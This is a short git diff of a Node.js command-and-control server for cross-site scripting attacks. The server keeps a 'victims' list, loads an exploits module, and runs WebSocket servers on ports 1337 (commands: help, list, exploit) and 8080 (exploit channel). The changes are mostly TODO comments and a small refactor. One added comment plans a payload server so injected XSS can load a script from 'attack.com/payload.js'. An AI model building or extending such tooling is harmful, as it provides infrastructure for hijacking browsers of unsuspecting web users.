@@ -5,10 +5,13 @@ const exploits = require('./exploits')
 const victims = {}
 
 function handle_cmd(conn, cmd, args) {
+    // TODO Implement these in separate functions
+    // TODO Change cmds to an object like { 'func_name': func_ref }
+    // TODO Add an import command to allow importing custom exploits
     const cmds = ['help', 'list', 'exploit']
     switch(cmd) {
         case 'help':
-            conn.send('list|exploit')
+            conn.send(cmds.join('|'))
             break
         case 'list':
             const listables = ['victims', 'exploits']
@@ -54,6 +57,7 @@ function handle_cmd(conn, cmd, args) {
 }
 
 function main() {
+    // TODO Move ports to a config file
     const CMD_PORT = 1337
     new ws.Server({ port: CMD_PORT })
     .on('connection', conn => {
@@ -65,6 +69,8 @@ function main() {
         })
     })
     console.log('Command server running on port ' + CMD_PORT)
+
+    // TODO Add a payload server so XSS can just do <script src='attack.com/payload.js'>
 
     const EXPLOIT_PORT = 8080
     new ws.Server({ port: EXPLOIT_PORT })
